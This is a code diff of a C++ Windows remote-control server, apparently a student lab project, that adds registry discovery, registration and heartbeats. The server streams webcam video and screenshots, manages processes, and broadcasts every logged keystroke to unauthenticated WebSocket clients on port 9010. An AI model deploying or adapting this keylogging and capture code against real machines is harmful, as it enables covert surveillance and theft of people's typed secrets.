@@ -1,16 +1,16 @@
-#define WIN32_LEAN_AND_MEAN // Giảm bớt kích thước file header Windows
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#include <boost/beast/core.hpp> // Thư viện Boost.Beast
-#include <boost/beast/websocket.hpp> // Thư viện WebSocket của Boost.Beast
-#include <boost/asio/ip/tcp.hpp> // Thư viện Boost.Asio TCP
+#include <boost/beast/core.hpp>
+#include <boost/beast/websocket.hpp>
+#include <boost/asio/ip/tcp.hpp>
 #include <iostream>
 #include <string>
 #include <thread>
 #include <mutex>
 #include <vector>
 #include <algorithm>
-#include <nlohmann/json.hpp> // Thư viện JSON nlohmann
-//
+#include <nlohmann/json.hpp>
+
 // Include các module
 #include "core/CommandDispatcher.hpp"
 #include "interfaces/IRemoteModule.hpp"
@@ -18,7 +18,9 @@
 #include "modules/WebcamManager.hpp"
 #include "modules/ScreenManager.hpp"  // Phải có file này (chứa hàm static capture_screen_data)
 #include "modules/ProcessManager.hpp" // Module vừa tách file
-#include "modules/KeyManager.hpp"
+
+#include <boost/beast/http.hpp>
+#include <chrono>
 
 namespace beast     = boost::beast;
 namespace websocket = beast::websocket;
@@ -26,61 +28,72 @@ namespace net       = boost::asio;
 using tcp           = net::ip::tcp;
 using json          = nlohmann::json;
 
+namespace http = boost::beast::http;
+
 // ==================== GLOBALS ====================
-static std::mutex cout_mtx; // Mutex để đồng bộ hóa việc ghi console, tránh lộn xộn khi nhiều thread ghi cùng lúc, nhất là trong do_session
-CommandDispatcher g_dispatcher; // Biến toàn cục CommandDispatcher để quản lý các module
+static std::mutex cout_mtx;
+KeyManager keyManager;
+CommandDispatcher g_dispatcher;
+
+class KeyManagerAdapter : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override { 
+        static const std::string name = "KEYBOARD"; return name; 
+    }
+    json handle_command(const json& request) override { return keyManager.handle_command(request); }
+};
 
 // ==================== SESSION MANAGER ====================
 class SessionManager {
 public:
-    void join(websocket::stream<tcp::socket>* ws) { // Thêm session mới vào danh sách đang hoạt động 
-        std::lock_guard<std::mutex> lock(mutex_); // Đồng bộ hóa truy cập vào danh sách 
+    void join(websocket::stream<tcp::socket>* ws) {
+        std::lock_guard<std::mutex> lock(mutex_);
         sessions_.push_back(ws);
     }
-    void leave(websocket::stream<tcp::socket>* ws) { // Xóa session khỏi danh sách khi kết thúc 
+    void leave(websocket::stream<tcp::socket>* ws) {
         std::lock_guard<std::mutex> lock(mutex_);
         sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
     }
-    void broadcast(const std::string& message) { // Gửi tin nhắn đến tất cả session đang hoạt động để thông báo key press 
-        std::lock_guard<std::mutex> lock(mutex_); // Đồng bộ hóa truy cập vào danh sách
-        for (auto* ws : sessions_) { // Gửi tin nhắn đến từng session 
+    void broadcast(const std::string& message) {
+        std::lock_guard<std::mutex> lock(mutex_);
+        for (auto* ws : sessions_) {
             try {
-                ws->text(true); // Chuyển về Text mode 
-                ws->write(net::buffer(message)); // Gửi tin nhắn, có tác dụng thông báo key press đến client
-            } catch (...) {} // Bỏ qua lỗi nếu có (ví dụ session đã đóng)
+                ws->text(true);
+                ws->write(net::buffer(message));
+            } catch (...) {}
         }
     }
 private:
-    std::vector<websocket::stream<tcp::socket>*> sessions_; // Danh sách các session WebSocket đang hoạt động
-    std::mutex mutex_; // Mutex để đồng bộ hóa truy cập vào danh sách session, hoạt động đa luồng
+    std::vector<websocket::stream<tcp::socket>*> sessions_;
+    std::mutex mutex_;
 };
 static SessionManager g_sessionManager;
 
 // ==================== SESSION LOOP ====================
 void do_session(tcp::socket s) {
-    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s)); // Tạo shared_ptr cho WebSocket stream để dễ dàng quản lý vòng đời trong lambda và các callback
+    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s));
     
     // Mutex để đồng bộ hóa việc gửi dữ liệu (tránh tranh chấp giữa Main Thread và Webcam Thread)
-    auto ws_mutex = std::make_shared<std::mutex>(); // Mutex dùng chung cho session này, hoạt động đa luồng, cho phép khóa khi gửi dữ liệu, có nghĩa là cả Main Thread và Webcam Thread đều dùng chung mutex này để tránh tranh chấp khi gửi dữ liệu qua WebSocket, khi một luồng đang gửi dữ liệu thì luồng kia phải chờ
+    auto ws_mutex = std::make_shared<std::mutex>();
 
     try {
         // Log kết nối
         std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
         { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }
 
-        ws->accept(); // Chấp nhận kết nối WebSocket từ client
-        g_sessionManager.join(ws.get()); // Đăng ký session mới vào SessionManager
+        ws->accept();
+        g_sessionManager.join(ws.get());
 
-        for (;;) { // Vòng lặp chính của session, chờ và xử lý tin nhắn từ client
+        for (;;) {
             beast::flat_buffer buffer;
-            ws->read(buffer); // Block chờ tin nhắn từ Client, sử dụng cơ chế blocking I/O đơn giản, cơ chế đồng bộ
+            ws->read(buffer); // Block chờ tin nhắn từ Client
             
-            std::string req_str = beast::buffers_to_string(buffer.data()); // Chuyển buffer thành chuỗi
-            json request, response; // Biến JSON để lưu request và response
+            std::string req_str = beast::buffers_to_string(buffer.data());
+            json request, response;
             bool response_sent_binary = false; // Cờ đánh dấu nếu đã gửi binary rồi
 
             try {
-                request = json::parse(req_str); // Phân tích chuỗi JSON từ client
+                request = json::parse(req_str);
                 std::string module = request.value("module", "");
                 std::string cmd = request.value("command", "");
 
@@ -92,11 +105,11 @@ void do_session(tcp::socket s) {
                             std::cout << "[MAIN] Webcam Stream Started\n";
                             // Callback chạy trên thread riêng của WebcamManager
                             cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
-                                std::lock_guard<std::mutex> lock(*ws_mutex); // Khóa mutex để tránh tranh chấp khi gửi dữ liệu, có nghĩa là webcam thread sẽ chờ nếu main thread đang gửi dữ liệu
+                                std::lock_guard<std::mutex> lock(*ws_mutex);
                                 try {
-                                    if(ws->is_open()) { // Kiểm tra kết nối vẫn mở trước khi gửi
+                                    if(ws->is_open()) {
                                         ws->binary(true); // Chế độ Binary
-                                        ws->write(net::buffer(data.data(), data.size())); // Gửi dữ liệu ảnh webcam dưới dạng binary
+                                        ws->write(net::buffer(data.data(), data.size()));
                                     }
                                 } catch (...) {}
                             });
@@ -110,16 +123,16 @@ void do_session(tcp::socket s) {
                 } 
 
                 // --- 2. XỬ LÝ SCREENSHOT (BINARY MODE - TỐI ƯU) ---
-                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") { // Yêu cầu chụp màn hình
-                    std::vector<uint8_t> jpg_data; // Buffer để lưu dữ liệu JPEG
-                    std::string err; // Biến lưu lỗi nếu có
+                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") {
+                    std::vector<uint8_t> jpg_data;
+                    std::string err;
                     
                     // Gọi hàm static chụp ảnh JPEG (đã cài đặt ở ScreenManager_win.cpp)
-                    if (ScreenManager::capture_screen_data(jpg_data, err)) { // Thành công
+                    if (ScreenManager::capture_screen_data(jpg_data, err)) {
                         {
-                            std::lock_guard<std::mutex> lock(*ws_mutex); // Khóa mutex để tránh tranh chấp khi gửi dữ liệu
-                            ws->binary(true); // Chế độ Binary
-                            ws->write(net::buffer(jpg_data.data(), jpg_data.size())); // Gửi dữ liệu ảnh JPEG dưới dạng binary
+                            std::lock_guard<std::mutex> lock(*ws_mutex);
+                            ws->binary(true);
+                            ws->write(net::buffer(jpg_data.data(), jpg_data.size()));
                         }
                         // Client nhận binary xong không cần JSON response chứa ảnh nữa
                         // Nhưng ta vẫn gửi JSON xác nhận lệnh đã xong (Client có thể ignore)
@@ -139,11 +152,11 @@ void do_session(tcp::socket s) {
                 response = {{"status", "error"}, {"message", e.what()}};
             }
 
-            // Gửi phản hồi JSON kết thúc lệnh (trừ khi cần thiết), trừ trường hợp đã gửi binary trong lệnh chụp màn hình
+            // Gửi phản hồi JSON kết thúc lệnh (trừ khi cần thiết)
             {
-                std::lock_guard<std::mutex> lock(*ws_mutex); // Khóa mutex để tránh tranh chấp khi gửi dữ liệu
+                std::lock_guard<std::mutex> lock(*ws_mutex);
                 ws->text(true); // Chuyển về Text mode
-                ws->write(net::buffer(response.dump())); // Gửi phản hồi JSON cho client 
+                ws->write(net::buffer(response.dump()));
             }
         }
 
@@ -151,36 +164,260 @@ void do_session(tcp::socket s) {
         { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
         
         // Stop webcam nếu client ngắt kết nối đột ngột
-        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) { // Kiểm tra và dừng webcam nếu đang chạy
+        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) {
             cam->stop_stream();
         }
     }
 
-    g_sessionManager.leave(ws.get()); // Hủy đăng ký session khỏi SessionManager khi kết thúc
+    g_sessionManager.leave(ws.get());
+}
+
+
+std::string get_computer_name() {
+    char buf[256];
+    DWORD size = sizeof(buf);
+    if (GetComputerNameA(buf, &size)) {
+        return std::string(buf);
+    }
+    return "UNKNOWN-PC";
+}
+std::string get_local_ip() {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+
+    struct hostent* host = gethostbyname(hostname);
+    if (!host) return "127.0.0.1";
+
+    struct in_addr addr;
+    memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
+
+    WSACleanup();
+    return std::string(inet_ntoa(addr));
+}
+std::string get_os_name() {
+#ifdef _WIN64
+    return "Windows 64-bit";
+#elif _WIN32
+    return "Windows 32-bit";
+#else
+    return "Unknown OS";
+#endif
+}
+
+// std::string get_subnet() {
+//     std::string ip = get_local_ip(); // bạn đã có hàm này
+//     size_t lastDot = ip.rfind('.');
+//     return ip.substr(0, lastDot); // ví dụ "192.168.1"
+// }
+// std::string detect_registry_server() {
+//     std::string subnet = get_subnet();
+
+//     for (int i = 1; i <= 254; i++) {
+//         std::string ip = subnet + "." + std::to_string(i);
+
+//         try {
+//             net::io_context ctx;
+//             tcp::socket sock(ctx);
+//             beast::error_code ec;
+
+//             sock.connect({ net::ip::make_address(ip, ec), 3000 }, ec);
+
+//             if (!ec) {
+//                 std::cout << "[DETECT] Registry found at: " << ip << "\n";
+//                 return ip;
+//             }
+//         }
+//         catch (...) {}
+//     }
+
+//     return ""; // not found
+// }
+static std::string registry_host = "";
+
+
+// ==================== REGISTRY CLIENT ====================
+
+void registerToRegistry()
+{
+    try {
+        net::io_context ctx;
+        tcp::resolver resolver(ctx);
+        beast::tcp_stream stream(ctx);
+
+        auto const host = registry_host;//"localhost";
+        auto const port = "3000";
+        auto const target = "/api/agents/register";
+
+        // Resolve + connect
+        auto const results = resolver.resolve(host, port);
+        stream.connect(results);
+
+        // JSON body gửi lên Registry
+        json body = {
+    {"machineId", get_computer_name()},
+    {"ip", get_local_ip()},
+    {"os", get_os_name()},
+    {"wsPort", 9010},
+    {"tags", json::array({"lab", "student"})}
+        };
+
+        std::string body_str = body.dump();
+
+        http::request<http::string_body> req{ http::verb::post, target, 11 };
+        req.set(http::field::host, host);
+        req.set(http::field::content_type, "application/json");
+        req.body() = body_str;
+        req.prepare_payload();
+
+        http::write(stream, req);
+
+        // Đọc response (không dùng nhưng nên đọc để hoàn tất phiên)
+        beast::flat_buffer buffer;
+        http::response<http::string_body> res;
+        http::read(stream, buffer, res);
+
+        // Đóng socket
+        beast::error_code ec;
+        stream.socket().shutdown(tcp::socket::shutdown_both, ec);
+
+        std::cout << "[REGISTRY] Registered OK: " << res.result_int() << "\n";
+    }
+    catch (const std::exception& e) {
+        std::cout << "[REGISTRY] Register FAILED: " << e.what() << "\n";
+    }
+}
+
+void sendHeartbeat()
+{
+    try {
+        net::io_context ctx;
+        tcp::resolver resolver(ctx);
+        beast::tcp_stream stream(ctx);
+
+
+        auto const host = registry_host;//"localhost";
+        auto const port = "3000";
+        auto const target = "/api/agents/heartbeat";
+
+        auto const results = resolver.resolve(host, port);
+        stream.connect(results);
+
+        json body = {
+            {"machineId",get_computer_name()}
+        };
+
+        std::string body_str = body.dump();
+
+        http::request<http::string_body> req{ http::verb::post, target, 11 };
+        req.set(http::field::host, host);
+        req.set(http::field::content_type, "application/json");
+        req.body() = body_str;
+        req.prepare_payload();
+
+        http::write(stream, req);
+
+        beast::flat_buffer buffer;
+        http::response<http::string_body> res;
+        http::read(stream, buffer, res);
+
+        beast::error_code ec;
+        stream.socket().shutdown(tcp::socket::shutdown_both, ec);
+
+        std::cout << "[REGISTRY] Heartbeat OK\n";
+    }
+    catch (const std::exception& e) {
+        std::cout << "[REGISTRY] Heartbeat FAILED: " << e.what() << "\n";
+    }
+}
+
+#include <boost/asio.hpp> 
+using boost::asio::ip::udp;
+std::string udp_discover_registry()
+{
+    try {
+        boost::asio::io_context io;
+
+        udp::socket socket(io);
+        socket.open(udp::v4());
+
+        socket.bind(udp::endpoint(udp::v4(), 0));
+
+        socket.set_option(boost::asio::socket_base::broadcast(true));
+        socket.non_blocking(true);
+
+        udp::endpoint broadcast_ep(boost::asio::ip::address_v4::broadcast(), 8888);
+
+        std::string msg = "DISCOVER_REGISTRY";
+        socket.send_to(boost::asio::buffer(msg), broadcast_ep);
+
+        char data[256] = {};
+        udp::endpoint sender;
+
+        for (int i = 0; i < 30; i++) {       // retry 3 giây
+            boost::system::error_code ec;
+            size_t len = socket.receive_from(boost::asio::buffer(data), sender, 0, ec);
+
+            if (!ec && len > 0) {
+                std::string reply(data, len);
+                if (reply.rfind("REGISTRY_IP:", 0) == 0)
+                    return reply.substr(12);
+            }
+            Sleep(100);
+        }
+    }
+    catch (...) {}
+
+    return "";
 }
 
 int main() {
-    SetConsoleOutputCP(CP_UTF8); // Thiết lập mã hóa UTF-8 cho console Windows
+
+    SetConsoleOutputCP(CP_UTF8);
     std::cout << "=== REMOTE SERVER (Binary Optimized) ===\n";
 
+    // Đăng ký module
+    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
+    // ProcessManager giờ đã được đăng ký tự động trong constructor của CommandDispatcher 
+    // (Nếu bạn sửa CommandDispatcher.hpp), hoặc đăng ký thủ công tại đây nếu muốn:
+    // g_dispatcher.register_module(std::make_unique<ProcessManager>());
+
     // Callback cho Keylogger
-    KeyManager::set_callback([&](std::string key_char) { 
+    KeyManager::set_callback([&](std::string key_char) {
         json msg; 
         msg["module"] = "KEYBOARD"; 
         msg["command"] = "PRESS"; 
         msg["data"] = { {"key", key_char} };
         g_sessionManager.broadcast(msg.dump());
     });
+    registry_host = udp_discover_registry();//"192.168.88.102";
+    // 1️⃣ Đăng ký agent lần đầu
+    // registerToRegistry();
+    if (registry_host.empty()) {
+        std::cout << "[ERROR] Không tìm thấy registry server (UDP discovery failed)\n";
+    } else {
+        registerToRegistry();
+    }
 
-    try { 
-        net::io_context ioc{1}; // Chỉ sử dụng 1 thread cho io_context vì ta dùng blocking I/O đơn giản
-        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}}; // Lắng nghe trên cổng 9010
+    // 2️⃣ Tạo thread gửi heartbeat định kỳ 10 giây/lần
+    std::thread([]() {
+        while (true) {
+            sendHeartbeat();
+            std::this_thread::sleep_for(std::chrono::seconds(10));
+        }
+        }).detach();
+    
+    try {
+        net::io_context ioc{1};
+        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
         std::cout << "[SERVER] Listening on port 9010...\n";
 
-        for (;;) { // Vòng lặp chấp nhận kết nối mới
-            tcp::socket socket{ioc}; // Tạo socket mới cho kết nối đến
-            acceptor.accept(socket); // Chấp nhận kết nối
-            std::thread(do_session, std::move(socket)).detach(); // Tạo thread mới để xử lý session và tách nó ra chạy ngầm
+        for (;;) {
+            tcp::socket socket{ioc};
+            acceptor.accept(socket);
+            std::thread(do_session, std::move(socket)).detach();
         }
     } catch (const std::exception& e) {
         std::cerr << "[FATAL] " << e.what() << "\n";
